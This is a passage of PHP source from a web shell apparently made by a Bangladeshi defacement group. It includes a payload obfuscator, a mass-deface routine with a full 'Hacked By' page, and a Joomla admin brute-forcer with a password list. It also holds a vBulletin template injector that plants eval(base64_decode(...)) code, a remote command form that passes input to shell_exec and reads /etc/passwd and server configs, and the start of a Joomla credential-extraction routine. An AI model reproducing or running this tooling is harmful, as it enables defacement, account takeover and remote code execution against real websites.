                                                    <option value="gzinflate">str_rot13 - gzinflate - base64</option>
                                                    <option value="base6416x">Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64 - Base64</option>
                                                    <option value="coeg">gzinflate - base64</option>
                                                    <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
                                                </select>&nbsp;<input class='inputzbut' type='submit' name='submit' value='Encrypt'>
                                                <input class='inputzbut' type='submit' name='submits' value='Decrypt'>
                                            </form>

                                            <?php
                                            $submit = $_POST['submit'];
                                            if (isset($submit)){
                                                $op = $_POST["ope"];
                                                switch ($op) {case 'base64': $codi=base64_encode($text);
                                                    break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
                                                    break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
                                                    break;case 'coeg' : $codi=base64_encode(gzdeflate($text));
                                                    break;case 'base6416x' : $codi=base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(($text)))))))))))))))));
                                                    break;case 'super' : $codi=base64_encode(str_rot13(gzdeflate(base64_encode(str_rot13(gzdeflate(str_rot13($text)))))));
                                                    break;default:break;}}

                                            $submit = $_POST['submits'];
                                            if (isset($submit)){
                                                $op = $_POST["ope"];
                                                switch ($op) {case 'base64': $codi=base64_decode($text);
                                                    break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
                                                    break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
                                                    break;case 'coeg' : $codi=gzinflate(base64_decode($text));
                                                    break;case 'base6416x' : $codi=base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(($text)))))))))))))))));
                                                    break;case 'super' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(gzinflate(str_rot13(base64_decode($text)))))));
                                                    break;default:break;}}

                                            $myfile = fopen("x.txt", "w") or die("Unable to open file!");
                                            fwrite($myfile, $codi);
                                            fclose($myfile);

                                            echo '<center><div id="menu"><br><br>
<a href="x.txt" target="blank_">Result</a></div>';


                                            }

                                            /////////////////////////////////////////////////////////////////////////////////////////////

                                            elseif(isset($_GET['x']) && ($_GET['x'] == 'mass'))
                                            {


                                            error_reporting(0);?>
                                            <br>
                                            <center><div id="menu"><a href="?<?php echo "y=".$pwd; ?>&amp;x=sabun">Mass Deface v2.0</a>  <a href="?<?php echo "y=".$pwd; ?>&amp;x=massdeface2">Alternate Mass Deface</a>  <a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass Deface</a></center><br>
                                            <center>
                                                <center/><br/><b><font color=#00ff00>-=[ Mass Deface Coded By Sid Gifari </font></b><br>
                                                <form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
                                                    <td><table><table class="tabnet" >
                                                                <form hethot='post'>
                                                                    <tr>
                                                                    <tr>
                                                                        <td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd();?>"></td>
                                                                    </tr><br>
                                                                    <tr>
                                                                        <td>File name</td><td><input class ='inputz' type='text' name='file' size='60' value="index.php"></td>
                                                                    </tr>
                                                                    </tr>
                                                                    <th colspan='2'><b>Index code</b></th><br></table>
<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'><html>
<script>alert("HACKED BY SID GIFARI FROM BANGLADESH LEVEL SEVEN HACKERS")</script>
<head ><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<meta http-equiv="Content-Language" content="en-us">

<meta content="Hacked By Sid Gifari" name="description"/>
<meta content="Hacked By Sid Gifari" name="keywords"/>
<meta content="Hacked By Sid Gifari" name="Abstract"/>


<link rel="icon" href="https://i.imgsafe.org/485eefc.png">
<title>[.:.] Hacked By Sid Gifari From BD_LEVEL_7 [.:.]</title>

<style type="text/css">
h1 {color: #333;font-size: 100px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Pacifico, cursive;}
.neon {color: #44d319;text-shadow: 0 0 5px #19e743, 0 0 10px #19e743, 0 0 30px #19e743, 0 0 45px #19e743, 0 0 60px #19e743;}
h2 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Audiowide;}
.neon {color: #FFFFFF;text-shadow: 0 0 5px #19e743, 0 0 10px #19e743, 0 0 30px #19e743, 0 0 45px #19e743, 0 0 60px #19e743;}
h3 {color: #333;font-size: 35px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Audiowide;}
.neon {color: #FFFFFF;text-shadow: 0 0 5px #19e743, 0 0 10px #19e743, 0 0 30px #19e743, 0 0 45px #19e743, 0 0 60px #19e743;}
.matrix {color:#FFFFFF; font-family:Pacifico, cursive; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
.jokitz1{
	text-align : center;
	}
.jokitz2{
	text-align : center;
	font-family : Courier;
	}
			.link-container a,

.aabir{

		font-family: 'Orbitron', sans-serif;
		
		
		
	}
body {	
background: black url("https://images.alphacoders.com/451/thumb-1920-451603.jpg?i10c=img.resize(height:160)");
background-repeat: repeat;
background-position: center;
background-attachment: fixed;
}
</style>
</head>

<body  bgcolor=black lang=EN-US style='tab-interval:36.0pt; text-align:center'> <onload=type_text()>


<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Audiowide' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>

<p align="center" dir="ltr"></p>

<script type="text/javascript">

<!--

//Disable right click script

//visit http://www.rainbow.arch.scriptmania.com/scripts/

var message="_|_";

///////////////////////////////////

function clickIE() {if (document.all) {(message);return false;}}

function clickNS(e) {if

(document.layers||(document.getElementById&&!document.all)) {

if (e.which==2||e.which==3) {(message);return false;}}}

if (document.layers)

{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}

else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}

document.oncontextmenu=new Function("return false")

// -->

</script>

<!-- <script language="JavaScript1.2" type="text/javascript">

function ClearError() {return true;}

window.onerror = ClearError;

</script> -->

<script type="text/javascript" language="javascript">



<!--

var rows=1; // must be an odd number

var speed=10; // lower is faster

var reveal=2; // between 0 and 2 only. The higher, the faster the word appears

var effectalign="center" //enter "center" to center it.



/***********************************************

* The Matrix Text Effect- by Richard Womersley (http://www.mf2fm.co.uk/rv)

* This notice must stay intact for use

* Visit http://www.dynamicdrive.com/ for full source code

***********************************************/



var w3c=document.getElementById && !window.opera;;

var ie45=document.all && !window.opera;

var ma_tab, matemp, ma_bod, ma_row, x, y, columns, ma_txt, ma_cho;

var m_coch=new Array();

var m_copo=new Array();

window.onload=function() {

	if (!w3c && !ie45) return

  var matrix=(w3c)?document.getElementById("matrix"):document.all["matrix"];

  ma_txt=(w3c)?matrix.firstChild.nodeValue:matrix.innerHTML;

  ma_txt=" "+ma_txt+" ";

  columns=ma_txt.length;

  if (w3c) {

    while (matrix.childNodes.length) matrix.removeChild(matrix.childNodes[0]);

    ma_tab=document.createElement("table");

    ma_tab.setAttribute("border", 0);

    ma_tab.setAttribute("align", effectalign);

    

    ma_bod=document.createElement("tbody");

    for (x=0; x<rows; x++) {

      ma_row=document.createElement("tr");

      for (y=0; y<columns; y++) {

        matemp=document.createElement("td");

        matemp.setAttribute("id", "Mx"+x+"y"+y);

        matemp.className="matrix";

        matemp.appendChild(document.createTextNode(String.fromCharCode(160)));

        ma_row.appendChild(matemp);

      }

      ma_bod.appendChild(ma_row);

    }

    ma_tab.appendChild(ma_bod);

    matrix.appendChild(ma_tab);

  } else {

    ma_tab='<ta'+'ble align="'+effectalign+'" border="0" style="background-color:#000000">';

    for (var x=0; x<rows; x++) {

      ma_tab+='<t'+'r>';

      for (var y=0; y<columns; y++) {

        ma_tab+='<t'+'d class="matrix" id="Mx'+x+'y'+y+'"> </'+'td>';

      }

      ma_tab+='</'+'tr>';

    }

    ma_tab+='</'+'table>';

    matrix.innerHTML=ma_tab;

  }

  ma_cho=ma_txt;

  for (x=0; x<columns; x++) {

    ma_cho+=String.fromCharCode(32+Math.floor(Math.random()*94));

    m_copo[x]=0;

  }

  ma_bod=setInterval("mytricks()", speed);

}



function mytricks() {

  x=0;

  for (y=0; y<columns; y++) {

    x=x+(m_copo[y]==100);

    ma_row=m_copo[y]%100;

    if (ma_row && m_copo[y]<100) {

      if (ma_row<rows+1) {

        if (w3c) {

          matemp=document.getElementById("Mx"+(ma_row-1)+"y"+y);

          matemp.firstChild.nodeValue=m_coch[y];

        }

        else {

          matemp=document.all["Mx"+(ma_row-1)+"y"+y];

          matemp.innerHTML=m_coch[y];

        }

        matemp.style.color="#0bf126";

        matemp.style.fontWeight="Pacifico, cursive";

      }

      if (ma_row>1 && ma_row<rows+2) {

        matemp=(w3c)?document.getElementById("Mx"+(ma_row-2)+"y"+y):document.all["Mx"+(ma_row-2)+"y"+y];

        matemp.style.fontWeight="normal";

        matemp.style.color="#0bf126";

      }

      if (ma_row>2) {

          matemp=(w3c)?document.getElementById("Mx"+(ma_row-3)+"y"+y):document.all["Mx"+(ma_row-3)+"y"+y];

        matemp.style.color="#f00a0a";

      }

      if (ma_row<Math.floor(rows/2)+1) m_copo[y]++;

      else if (ma_row==Math.floor(rows/2)+1 && m_coch[y]==ma_txt.charAt(y)) zoomer(y);

      else if (ma_row<rows+2) m_copo[y]++;

      else if (m_copo[y]<100) m_copo[y]=0;

    }

    else if (Math.random()>0.9 && m_copo[y]<100) {

      m_coch[y]=ma_cho.charAt(Math.floor(Math.random()*ma_cho.length));

      m_copo[y]++;

    }

  }

  if (x==columns) clearInterval(ma_bod);

}



function zoomer(ycol) {

  var mtmp, mtem, ytmp;

  if (m_copo[ycol]==Math.floor(rows/2)+1) {

    for (ytmp=0; ytmp<rows; ytmp++) {

      if (w3c) {

        mtmp=document.getElementById("Mx"+ytmp+"y"+ycol);

        mtmp.firstChild.nodeValue=m_coch[ycol];

      }

      else {

        mtmp=document.all["Mx"+ytmp+"y"+ycol];

        mtmp.innerHTML=m_coch[ycol];

      }

      mtmp.style.color="#0bf126";

      mtmp.style.fontWeight="Pacifico, cursive";

    }

    if (Math.random()<reveal) {

      mtmp=ma_cho.indexOf(ma_txt.charAt(ycol));

      ma_cho=ma_cho.substring(0, mtmp)+ma_cho.substring(mtmp+1, ma_cho.length);

    }

    if (Math.random()<reveal-1) ma_cho=ma_cho.substring(0, ma_cho.length-1);

    m_copo[ycol]+=199;

    setTimeout("zoomer("+ycol+")", speed);

  }

  else if (m_copo[ycol]>200) {

    if (w3c) {

      mtmp=document.getElementById("Mx"+(m_copo[ycol]-201)+"y"+ycol);

      mtem=document.getElementById("Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol);

    }

    else {

      mtmp=document.all["Mx"+(m_copo[ycol]-201)+"y"+ycol];

      mtem=document.all["Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol];

    }

    mtmp.style.fontWeight="normal";

    mtem.style.fontWeight="normal";

    setTimeout("zoomer("+ycol+")", speed);

  }

  else if (m_copo[ycol]==200) m_copo[ycol]=100+Math.floor(rows/2);

  if (m_copo[ycol]>100 && m_copo[ycol]<200) {

    if (w3c) {

      mtmp=document.getElementById("Mx"+(m_copo[ycol]-101)+"y"+ycol);

      mtmp.firstChild.nodeValue=String.fromCharCode(160);

      mtem=document.getElementById("Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol);

      mtem.firstChild.nodeValue=String.fromCharCode(160);

    }

    else {

      mtmp=document.all["Mx"+(m_copo[ycol]-101)+"y"+ycol];

      mtmp.innerHTML=String.fromCharCode(160);

      mtem=document.all["Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol];

      mtem.innerHTML=String.fromCharCode(160);

    }

    setTimeout("zoomer("+ycol+")", speed);

  }

  

  //start

var h1 = document.getElementsByTagName("h1")[0],

text = h1.innerText || h1.textContent,

split = [], i, lit = 0, timer = null;

for(i = 0; i < text.length; ++i) {

split.push("<span>" + text[i] + "</span>");

}

h1.innerHTML = split.join("");

split = h1.childNodes;



var flicker = function() {

lit += 0.01;

if(lit >= 1) {

clearInterval(timer);

}

for(i = 0; i < split.length; ++i) {

if(Math.random() < lit) {

split[i].className = "NEON";

} else {

split[i].className = "";

}

}

}

setInterval(flicker, 100);



}

//strat sec



// end  -->

</script>

<body>

<iframe width="1" height="1" src="https://www.youtube.com/embed/40DT4CEY0HY?rel=0&autoplay=1" frameborder="0" allowfullscreen></iframe>
<img height="800px" src="https://i.imgsafe.org/485eefc.png" alt="Sid Gifari" /><br>
<h2><font color="red" font-family: 'Pacifico', cursive;>Hacked By</font></h2>
<h1>Sid Gifari</h1>
<h3 style="color: lime;font-family: 'Pacifico', cursive;font-size: 32px;">FROM BANGLADESH LEVEL SEVEN HACKERS TEAM <font color="red">[BD_LEVEL_7]</font></h3>
<font face="Iceland" style="color:red;text-shadow:0px 1px 5px #000;font-size:30px">Admin Massage: Dear admin its just a security warning.......</font><br>
<font face="Iceland" style="color:lime;text-shadow:0px 1px 5px #000;font-size:30px">And just index change.......</font><br>
<font face="Iceland" style="color:red;text-shadow:0px 1px 5px #000;font-size:30px">Plz cheek your site security.......</font><br><br>
<font face="Iceland" style="color:lime;text-shadow:0px 1px 5px #000;font-size:30px">#NO_COMPROMISE....... [.:.]</font><br>
<font face="Iceland" style="color:red;text-shadow:0px 1px 5px #000;font-size:30px">#NO_AGREEMENT...... [.:.]</font><br>
<font face="Iceland" style="color:lime;text-shadow:0px 1px 5px #000;font-size:30px">#WE_ARE_JUSTICE...... [.:.]</font><br><br><br><br>

<font face="Iceland" style="color:red;text-shadow:0px 1px 5px #000;font-size:30px">[.:.]Contact With Us[.:.]</font><br/>
<font face="Iceland" style="color:#00FCFF;text-shadow:0px 1px 5px #000;font-size:40px"><a href="https://www.facebook.com/sid.gifari"><font face="Iceland" style="color:#074cfc;text-shadow:0px 1px 5px #000;font-size:30px">[ FACEBOOK:SID GIFARI ]</font></a><br>
<font face="Iceland" style="color:#00FCFF;text-shadow:0px 1px 5px #000;font-size:60px"><a href="https://www.facebook.com/groups/bd.level.7"><font color="white"><font color="White"><font color="GREEN">[GROUP:BD_LEVEL_7]</font></a>

<center><iframe src="https://www.facebook.com/plugins/likebox.php?href=https://www.facebook.com/bdlevelseven/?fref=ts" scrolling="no" style="border:none; overflow:hidden; width:400px; height:300px;" allowtransparency="true" 	frameborder="0"></iframe>
	</script></center>
<div id="matrix" class="auto-style" font-size="20px"> We are :CHECKK_MATE || SID_GIFARI || ZET_GIFARI || MATIR_MANUS || ERAJ || MASTER_BD || RED_ANT || FARDIN || STRANGE_SHADOW ||</div></font><br>



</body>
</html></textarea><br>
                                                            <center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form><br><br>
                                <br>Text Version Area<br>
                                    <textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>
<?php 	$ini="http://";
$mainpath=$_POST[path];
$file=$_POST[file];
$dir=opendir("$mainpath");
$code=base64_encode($_POST[index]);
$indx=base64_decode($code);
while($row=readdir($dir)){
    $start=@fopen("$row/$file","w+");
    $finish=@fwrite($start,$indx);
    if ($finish){echo"$ini$row/$file\n";}}
?>
</textarea><br>
                                <br><br><b>Text Version</b><br><br><br>
                                <?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
                                ?>
                                    <form action="?y=<?php echo $pwd; ?>&amp;x=jbrute" method="post">

                                        <meta name="author" content="RetnOHacK" />
                                        <meta name="keywords" content="Joomla, Bruter, JoomlaBruter, JoomlaBruterForce, JoomlaBruterForceOnline" />
                                        <meta name="description" content="RetnOHacK #Procoder'z Team Albanian" />
                                        <center>
                                            </br></br>
                                            <center><b><font color="lime">+--=[ Joomla Bruter Force ]=--+</font></b><br /><br />
                                                <form method="post" action="" enctype="multipart/form-data">
                                                    <table class="tabnet" width="38%" border="0"><center>
                                                            <th colspan="2">Joomla Brute Force</th>
                                                            <tr><td><p ><font  class="d1">User :</font></th>
                                                                <input class="inputz" type='text' name="usr" value="admin" size="15"> </font></center><br /><br /></p>
                                                        </td></tr>
                                                        <tr><td><font class="">Sites list :</font>
                                                            </td><td><font class="" >Pass list :</font></td></tr>
                                                        <tr>
                                                            <td>
                                                                <textarea name="sites" style="background:black;" cols="40" rows="13" ></textarea>
                                                            </td><td>
<textarea name="w0rds" style="background:black;" cols="40" rows="13" >
admin
123456
admin@1234
admin!234
admin@123
@1234
aadmin
admin2
password
102030
123123
12345
123456789
pass
test
admin123
demo
!@#$%^
</textarea>
                                                            </td></tr><center><tr><td>
                                                                    <font >
                                                                        <input class="inputzbut" type="submit" name="x" value="start" id="d4">
                                                                    </font></td></tr><br>
                                                            tanks for procoder'z team albanian<br></center></table>
                                                </form></center>
                                            <?
                                            @set_time_limit(0);

                                            if($_POST['x']){

                                                echo "<hr>";

                                                $sites = explode("\n",$_POST["sites"]); // Get Sites
                                                $w0rds = explode("\n",$_POST["w0rds"]); // Get w0rdLiSt

                                                $Attack = new Joomla_brute_Force(); // Active Class


                                                foreach($w0rds as $pwd){

                                                    foreach($sites as $site){


                                                        $Attack->check_it(txt_cln($site),$_POST['usr'],txt_cln($pwd)); // Brute :D
                                                        flush();flush();

                                                    }

                                                }

                                            }


                                            # Class & Function'z

                                            function txt_cln($value){  return str_replace(array("\n","\r"),"",$value); }

                                            class Joomla_brute_Force{

                                                public function check_it($site,$user,$pass){ // print result

                                                    if(eregi('com_config',$this->post($site,$user,$pass))){

                                                        echo "<span class=\"x2\"><b># Success : $user:$pass -> <a href='$site/administrator/index.php'>$site/administrator/index.php</a></b></span><BR>";
                                                        $f = fopen("Result.txt","a+"); fwrite($f , "Success ~~ $user:$pass -> $site/administrator/index.php\n"); fclose($f);
                                                        flush();
                                                    }else{ echo "# Failed : $user:$pass -> $site<BR>"; flush();}

                                                }

                                                public function post($site,$user,$pass){ // Post -> user & pass

                                                    $token = $this->extract_token($site);

                                                    $curl=curl_init();

                                                    curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
                                                    curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php");
                                                    @curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt');
                                                    @curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt');
                                                    curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4');
                                                    @curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
                                                    curl_setopt($curl,CURLOPT_POST,1);
                                                    curl_setopt($curl,CURLOPT_POSTFIELDS,'username='.$user.'&passwd='.$pass.'&lang=en-GB&option=com_login&task=login&'.$token.'=1');
                                                    curl_setopt($curl,CURLOPT_TIMEOUT,20);

                                                    $exec=curl_exec($curl);
                                                    curl_close($curl);
                                                    return $exec;

                                                }

                                                public function extract_token($site){ // get token from source for -> function post

                                                    $source = $this->get_source($site);

                                                    preg_match_all("/type=\"hidden\" name=\"([0-9a-f]{32})\" value=\"1\"/si" ,$source,$token);

                                                    return $token[1][0];

                                                }

                                                public function get_source($site){ // get source for -> function extract_token

                                                    $curl=curl_init();
                                                    curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
                                                    curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php");
                                                    @curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt');
                                                    @curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt');
                                                    curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4');
                                                    @curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
                                                    curl_setopt($curl,CURLOPT_TIMEOUT,20);

                                                    $exec=curl_exec($curl);
                                                    curl_close($curl);
                                                    return $exec;

                                                }

                                            }
                                            }
                                            /////////////////////////////////////////////////////////////////////////////////////////////

                                            elseif(isset($_GET['x']) && ($_GET['x'] == 'vb'))
                                            {
                                            ?>
                                            <form action="?y=<?php echo $pwd; ?>&x=vb" method="post">
                                                <br><br><br><div align="center">
                                                    <H2><span style="font-weight: 400"><font face="Trebuchet MS" size="4">
                                                                <b><font color="#00FF00">+--=[ VB Index Changer ]=--+</font></b>
                                                </div><br>
                                                <?
                                                if(empty($_POST['index'])){
                                                    echo "<center><FORM method=\"POST\">";
                                                    echo "<table class=\"tabnet\">
<th colspan=\"2\">Vb Index Changer</th>
<tr><td>host </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"localhost\" value=\"localhost\"></td></tr>
<tr><td>database </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"database\" value=\"forum_vb\"></td></tr>
<tr><td>username </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"username\" value=\"user_vb\"></td></tr>
<tr><td>password </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"password\" value=\"vb\"></td></tr>
</tr>
<th colspan=\"2\">Your Index Code</th></table><table class=\"tabnet\">
<TEXTAREA name=\"index\" rows=\"13\" style=\"background:black\" border=\"1\" cols=\"69\" name=\"code\">your index code</TEXTAREA><br>
<INPUT class=\"inputzbut\" type=\"submit\" value=\"setting\" name=\"send\">
</FORM></table></center>";
                                                }else{
                                                    $localhost = $_POST['localhost'];
                                                    $database = $_POST['database'];
                                                    $username = $_POST['username'];
                                                    $password = $_POST['password'];
                                                    $index = $_POST['index'];
                                                    @mysql_connect($localhost,$username,$password) or die(mysql_error());
                                                    @mysql_select_db($database) or die(mysql_error());
                                                    $index=str_replace("\'","'",$index);
                                                    $set_index = "{\${eval(base64_decode(\'";
                                                    $set_index .= base64_encode("echo \"$index\";");
                                                    $set_index .= "\'))}}{\${exit()}}</textarea>";
                                                    echo("UPDATE template SET template ='".$set_index."' ") ;
                                                    $ok=@mysql_query("UPDATE template SET template ='".$set_index."'") or die(mysql_error());
                                                    if($ok){
                                                        echo "!! update finish !!<br><br>";
                                                    }
                                                }
                                                }

                                                //////////////////////////////////////////////////////////////////////////////////////////////

                                                elseif(isset($_GET['x']) && ($_GET['x'] == 'bypasscbe'))
                                                {
                                                ?>
                                                <form action="?y=<?php echo $pwd; ?>&amp;x=bypass" method="post">

                                                    <?php
                                                    echo "<center/><br/><b><font color=#00ff00>-=[ Command  Bypass Exploit BY BD_LEVEL_7]=-</font></b><br>
";
                                                    print_r('
<pre>
<form method="POST" action="">
<b><font color=#00ff00><b><font color="#00ff00">Command  :=) </font></font></b><input name="baba" type="text" class="inputz" size="34"><input type="submit" class="inputzbut" value="Go">
</form>
<form method="POST" action=""><strong><b><font color="#00ff00">Menu Bypass  :=)  </font></strong><select name="liz0" size="1" class="inputz">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" class="inputzbut" value="G&ouml;">
</form>
</pre>
');
                                                    ini_restore("safe_mode");
                                                    ini_restore("open_basedir");
                                                    $liz0=shell_exec($_POST[baba]);
                                                    $liz0zim=shell_exec($_POST[liz0]);
                                                    $uid=shell_exec('id');
                                                    $server=shell_exec('uname -a');
                                                    echo "<pre><h4>";

                                                    echo $liz0;
                                                    echo $liz0zim;
                                                    echo "</h4></pre>";
                                                    "</div>"; }

                                                    ///////////////////////////////////////////////////////////////////////////

                                                    elseif(isset($_GET['x']) && ($_GET['x'] == 'jodexer'))
                                                    {
                                                    ?>
                                                    <form action="?y=<?php echo $pwd; ?>&amp;x=jodexer" method="post">

                                                        <?php

                                                        function randomt() {

                                                            $chars = "abcdefghijkmnopqrstuvwxyz023456789";
                                                            srand((double)microtime()*1000000);
                                                            $i = 0;
                                                            $pass = '' ;

                                                            while ($i <= 7) {
                                                                $num = rand() % 33;
                                                                $tmp = substr($chars, $num, 1);
                                                                $pass = $pass . $tmp;
                                                                $i++;
                                                            }

                                                            return $pass;

                                                        }
                                                        function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
                                                        {
                                                            $ar0=explode($marqueurDebutLien, $text);
                                                            $ar1=explode($marqueurFinLien, $ar0[$i]);
                                                            $ar=trim($ar1[0]);
                                                            return $ar;
                                                        }
                                                        if ($_POST['form_action'])
                                                        {

                                                            $text=file_get_contents($_POST['file']);
                                                            $username=entre2v2($text,"public $user = '","';");
                                                            $password=entre2v2($text,"public $password = ', '","';");
                                                            $dbname=entre2v2($text,"public $db = ', '","';");
                                                            $dbprefix=entre2v2($text,"public $dbprefix = '","';");
                                                            $site_url=($_POST['site_url']);

                                                            $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";

                                                            $co=randomt();
                                                            /*
    echo($username);
    echo("<br>");
